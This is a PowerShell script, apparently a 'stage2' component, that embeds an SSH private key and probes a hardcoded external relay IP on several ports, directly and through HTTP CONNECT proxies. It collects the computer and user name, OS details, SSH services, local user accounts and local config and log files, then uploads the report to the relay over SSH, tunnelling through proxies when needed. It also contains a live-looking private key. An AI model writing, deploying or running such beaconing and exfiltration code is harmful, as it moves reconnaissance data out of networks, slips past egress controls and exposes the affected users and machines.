#b3-stage2 v0: probe the relay ports and send a report to the relay inbox. Installs nothing.
param([string]$B3Root = 'C:\ProgramData\b3')
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$OutputEncoding = New-Object System.Text.UTF8Encoding($false)
$Relay = '106.15.130.93'
$Ports = @(443, 22, 80, 3389)
$work = Join-Path $B3Root 'v0'
New-Item -ItemType Directory -Force -Path $work | Out-Null
$log = Join-Path $work 'v0.log'
function L([string]$m) { try { Add-Content -LiteralPath $log -Encoding UTF8 -Value ('{0:o} [{1}] {2}' -f (Get-Date), $env:USERNAME, $m) } catch {} }
L 'start'

# ---- inbox key (account can only store text on the relay) and pinned relay host key ----
$keyText = @'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDmgz/JyzTEUqQwBY4MzoOHIAxRe+pVYjSKz+PizKpjXwAAAJhS8KmBUvCp
gQAAAAtzc2gtZWQyNTUxOQAAACDmgz/JyzTEUqQwBY4MzoOHIAxRe+pVYjSKz+PizKpjXw
AAAEBQEqXwlY4XNc4pUO9KfygZhFDHe3n4+tpxf0ocgIY/lOaDP8nLNMRSpDAFjgzOg4cg
DFF76lViNIrP4+LMqmNfAAAAD2IzLWluYm94LXB1YmxpYwECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
'@
$hostKey = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPuoC4O5MLah2O8KeELpbmQ8UOj0DApoaq7qkzzYKRge'
$key = Join-Path $work 'inbox_key'
$kh = Join-Path $work 'known_hosts'
[IO.File]::WriteAllText($key, (($keyText -replace "`r`n", "`n").Trim() + "`n"), [Text.Encoding]::ASCII)
& icacls.exe $key /inheritance:r /grant:r '*S-1-5-18:F' '*S-1-5-32-544:F' | Out-Null
& icacls.exe $key /setowner '*S-1-5-32-544' | Out-Null
$khLines = @("$Relay $hostKey", "b3relay $hostKey") + @($Ports | ForEach-Object { "[$Relay]:$_ $hostKey" })
[IO.File]::WriteAllText($kh, (($khLines -join "`n") + "`n"), [Text.Encoding]::ASCII)

# ---- ssh client ----
$ssh = Join-Path $env:SystemRoot 'System32\OpenSSH\ssh.exe'
if (-not (Test-Path -LiteralPath $ssh)) {
    $zip = Join-Path $work 'OpenSSH-Win64.zip'
    $dir = Join-Path $work 'openssh'
    if (-not (Test-Path -LiteralPath (Join-Path $dir 'OpenSSH-Win64\ssh.exe'))) {
        $net = $null
        try { $net = Get-Content -LiteralPath (Join-Path $B3Root 'net.json') -Raw | ConvertFrom-Json } catch {}
        $routes = @('SYSTEM', 'DIRECT') + @($net.Proxies | Where-Object { $_ -like 'http*' })
        foreach ($r in $routes) {
            try {
                $wc = New-Object System.Net.WebClient
                if ($r -eq 'DIRECT') { $wc.Proxy = $null } elseif ($r -ne 'SYSTEM') { $wc.Proxy = New-Object System.Net.WebProxy($r) }
                $wc.DownloadFile('https://github.com/PowerShell/Win32-OpenSSH/releases/download/10.4.0.0p1-Preview/OpenSSH-Win64.zip', $zip)
                Expand-Archive -LiteralPath $zip -DestinationPath $dir -Force
                break
            } catch { L "openssh zip via $r failed: $($_.Exception.Message)" }
        }
    }
    $ssh = Join-Path $dir 'OpenSSH-Win64\ssh.exe'
}
$sshVer = (& cmd.exe /c "`"$ssh`" -V 2>&1" | Out-String).Trim()
L "ssh: $ssh $sshVer"

# ---- probe ----
function Open-Tcp([string]$h, [int]$p, [int]$ms) {
    $c = New-Object System.Net.Sockets.TcpClient
    $ar = $c.BeginConnect($h, $p, $null, $null)
    if (-not $ar.AsyncWaitHandle.WaitOne($ms)) { $c.Close(); throw 'timeout' }
    $c.EndConnect($ar)
    return $c
}
function Test-Ssh([int]$port, [string]$proxy) {
    $c = $null
    try {
        if (-not $proxy) { $c = Open-Tcp $Relay $port 6000; $s = $c.GetStream() }
        else {
            $u = [uri]$proxy
            $c = Open-Tcp $u.Host $u.Port 4000
            $s = $c.GetStream()
            $q = [Text.Encoding]::ASCII.GetBytes("CONNECT ${Relay}:$port HTTP/1.1`r`nHost: ${Relay}:$port`r`n`r`n")
            $s.Write($q, 0, $q.Length)
            $s.ReadTimeout = 8000
            $buf = New-Object byte[] 4096
            $n = $s.Read($buf, 0, 4096)
            $resp = [Text.Encoding]::ASCII.GetString($buf, 0, [Math]::Max($n, 0))
            if ($resp -notmatch '^HTTP/\S+\s+200') { return ('proxy replied: ' + ($resp -split "`r`n")[0]) }
            $rest = $resp.Substring([Math]::Max($resp.IndexOf("`r`n`r`n"), 0) + 4)
            if ($rest -match '^SSH-') { return 'OK' }
        }
        $s.ReadTimeout = 8000
        $buf = New-Object byte[] 256
        $n = $s.Read($buf, 0, 256)
        $t = [Text.Encoding]::ASCII.GetString($buf, 0, [Math]::Max($n, 0))
        if ($t -match '^SSH-') { return 'OK' }
        return ('not ssh: ' + $t.Substring(0, [Math]::Min(30, $t.Length)))
    } catch {
        $m = $_.Exception.Message
        if ($_.Exception.InnerException) { $m = $_.Exception.InnerException.Message }
        return ('fail: ' + $m)
    } finally { if ($c) { try { $c.Close() } catch {} } }
}
$net = $null
try { $net = Get-Content -LiteralPath (Join-Path $B3Root 'net.json') -Raw | ConvertFrom-Json } catch {}
$proxies = @($net.Proxies | Where-Object { $_ -like 'http*' })
$rows = @()
$good = @()
foreach ($p in $Ports) {
    $r = Test-Ssh $p ''
    $rows += "direct $p : $r"
    if ($r -eq 'OK') { $good += [pscustomobject]@{ Port = $p; Proxy = '' } }
}
foreach ($px in $proxies) {
    foreach ($p in @(443, 22)) {
        $r = Test-Ssh $p $px
        $rows += "via $px $p : $r"
        if ($r -eq 'OK') { $good += [pscustomobject]@{ Port = $p; Proxy = $px } }
    }
}
$rows | ForEach-Object { L $_ }

# ---- report ----
$report = New-Object System.Text.StringBuilder
[void]$report.AppendLine("b3 v0 report  computer=$env:COMPUTERNAME  user=$env:USERDOMAIN\$env:USERNAME  time=$((Get-Date).ToString('o'))")
[void]$report.AppendLine("ssh: $ssh  $sshVer")
[void]$report.AppendLine('--- probe'); $rows | ForEach-Object { [void]$report.AppendLine($_) }
foreach ($f in @('probe.json', 'net.json', 'poll.log')) {
    $fp = Join-Path $B3Root $f
    [void]$report.AppendLine("--- $f")
    if (Test-Path -LiteralPath $fp) { [void]$report.AppendLine((Get-Content -LiteralPath $fp -Raw -Encoding UTF8)) }
}
try {
    [void]$report.AppendLine('--- system')
    $os = Get-CimInstance Win32_OperatingSystem
    [void]$report.AppendLine("$($os.Caption) $($os.Version) lastboot=$($os.LastBootUpTime)")
    [void]$report.AppendLine(((Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like '*ssh*' } | ForEach-Object { "$($_.Name)=$($_.Status)" }) -join ' '))
    [void]$report.AppendLine(((Get-LocalUser -ErrorAction SilentlyContinue | ForEach-Object { "$($_.Name)/$($_.Enabled)" }) -join ' '))
} catch {}
$text = $report.ToString()

$sent = 0
$all = [bool]$env:B3_V0_ALLROUTES
$inFile = Join-Path $work 'report.txt'
$outFile = Join-Path $work 'send.out'
$errFile = Join-Path $work 'send.err'
foreach ($g in $good) {
    $routeText = "route port=$($g.Port) proxy=$($g.Proxy)"
    [IO.File]::WriteAllText($inFile, ("$routeText`n" + $text), (New-Object System.Text.UTF8Encoding($false)))
    $common = "-F NUL -T -i `"$key`" -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=yes -o `"UserKnownHostsFile=$kh`" -o GlobalKnownHostsFile=NUL -o ConnectTimeout=20"
    $listener = $null; $pending = $null
    if ($g.Proxy) {
        # Local forwarder: ssh connects to 127.0.0.1:<free port>; this script opens the proxy CONNECT and copies bytes both ways.
        $listener = New-Object System.Net.Sockets.TcpListener([Net.IPAddress]::Loopback, 0)
        $listener.Start()
        $lport = $listener.LocalEndpoint.Port
        $pending = $listener.BeginAcceptTcpClient($null, $null)
        $argLine = "$common -p $lport -o HostKeyAlias=b3relay b3-inbox@127.0.0.1"
    } else {
        $argLine = "$common -p $($g.Port) b3-inbox@$Relay"
    }
    $code = -1
    $pc = $null; $pr = $null
    try {
        $p = Start-Process -FilePath $ssh -ArgumentList $argLine -RedirectStandardInput $inFile -RedirectStandardOutput $outFile -RedirectStandardError $errFile -NoNewWindow -PassThru
        $null = $p.Handle
        if ($listener) {
            if ($pending.AsyncWaitHandle.WaitOne(20000)) {
                $pc = $listener.EndAcceptTcpClient($pending)
                $u = [uri]$g.Proxy
                $pr = New-Object System.Net.Sockets.TcpClient($u.Host, $u.Port)
                $ps2 = $pr.GetStream()
                $q = [Text.Encoding]::ASCII.GetBytes("CONNECT ${Relay}:$($g.Port) HTTP/1.1`r`nHost: ${Relay}:$($g.Port)`r`n`r`n")
                $ps2.Write($q, 0, $q.Length)
                $hdr = New-Object System.Collections.Generic.List[byte]
                while ($true) {
                    $b = $ps2.ReadByte(); if ($b -lt 0) { throw 'proxy closed' }
                    $hdr.Add([byte]$b); $n = $hdr.Count
                    if ($n -ge 4 -and $hdr[$n-4] -eq 13 -and $hdr[$n-3] -eq 10 -and $hdr[$n-2] -eq 13 -and $hdr[$n-1] -eq 10) { break }
                    if ($n -gt 16384) { throw 'proxy header too long' }
                }
                $first = [Text.Encoding]::ASCII.GetString($hdr.ToArray()).Split("`r")[0]
                if ($first -notmatch '^HTTP/\S+\s+200') { throw "proxy replied: $first" }
                $cs = $pc.GetStream()
                $null = $cs.CopyToAsync($ps2)
                $null = $ps2.CopyToAsync($cs)
            } else { L 'ssh did not connect to the local forwarder' }
        }
        if ($p.WaitForExit(90000)) { $p.WaitForExit(); $code = $p.ExitCode } else { try { $p.Kill() } catch {}; $code = 'timeout' }
    } catch { L "send error: $($_.Exception.Message)" }
    finally {
        foreach ($x in @($pc, $pr)) { if ($x) { try { $x.Close() } catch {} } }
        if ($listener) { try { $listener.Stop() } catch {} }
    }
    $o = ''
    foreach ($f in @($outFile, $errFile)) { if (Test-Path -LiteralPath $f) { $o += (Get-Content -LiteralPath $f -Raw) } }
    L "send $routeText exit=$code $(([string]$o).Trim())"
    if ($code -eq 0 -and $o -match 'stored') { $sent++; if (-not $all) { break } }
}
L "done sent=$sent"
if ($sent -gt 0) { exit 0 } else { exit 1 }
